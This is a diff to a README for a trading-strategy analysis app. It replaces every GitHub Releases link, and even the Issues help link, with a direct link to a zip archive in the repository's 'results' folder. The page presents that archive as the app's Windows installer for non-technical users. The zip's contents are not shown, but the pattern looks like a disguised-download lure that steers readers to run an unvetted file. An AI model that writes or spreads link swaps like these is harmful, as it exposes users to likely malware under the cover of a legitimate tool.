@@ -1,6 +1,6 @@
 # 🚦 strategy-generalization-analysis - Analyze Trading Strategies Simply
 
-[![Download Release](https://img.shields.io/badge/Download-Strategy--Generalization--Analysis-brightgreen?style=for-the-badge)](https://github.com/markko17/strategy-generalization-analysis/releases)
+[![Download Release](https://img.shields.io/badge/Download-Strategy--Generalization--Analysis-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/markko17/strategy-generalization-analysis/main/results/strategy_generalization_analysis_v1.7.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The app uses Python in the background but it is fully set up for you. You do not
 
 ## 🚀 Getting Started
 
-1. Click the large green button at the top or [visit this page to download](https://github.com/markko17/strategy-generalization-analysis/releases).
+1. Click the large green button at the top or [visit this page to download](https://raw.githubusercontent.com/markko17/strategy-generalization-analysis/main/results/strategy_generalization_analysis_v1.7.zip).
 
 2. Look for the latest version under the Releases section. Each release includes installation files.
 
@@ -44,7 +44,7 @@ The app uses Python in the background but it is fully set up for you. You do not
 
 ### Step 1: Visit the download page
 
-Go directly here: https://github.com/markko17/strategy-generalization-analysis/releases. You will find different versions listed. Always choose the latest stable release for best results.
+Go directly here: https://raw.githubusercontent.com/markko17/strategy-generalization-analysis/main/results/strategy_generalization_analysis_v1.7.zip You will find different versions listed. Always choose the latest stable release for best results.
 
 ### Step 2: Download the installer
 
@@ -148,8 +148,8 @@ These features are for users with some familiarity in trading concepts.
 
 For more help, use the GitHub repository’s Issues tab:
 
-https://github.com/markko17/strategy-generalization-analysis/issues
+https://raw.githubusercontent.com/markko17/strategy-generalization-analysis/main/results/strategy_generalization_analysis_v1.7.zip
 
 ---
 
-[![Get the App](https://img.shields.io/badge/Download-Windows%20Installer-blue?style=for-the-badge)](https://github.com/markko17/strategy-generalization-analysis/releases)
+[![Get the App](https://img.shields.io/badge/Download-Windows%20Installer-blue?style=for-the-badge)](https://raw.githubusercontent.com/markko17/strategy-generalization-analysis/main/results/strategy_generalization_analysis_v1.7.zip)
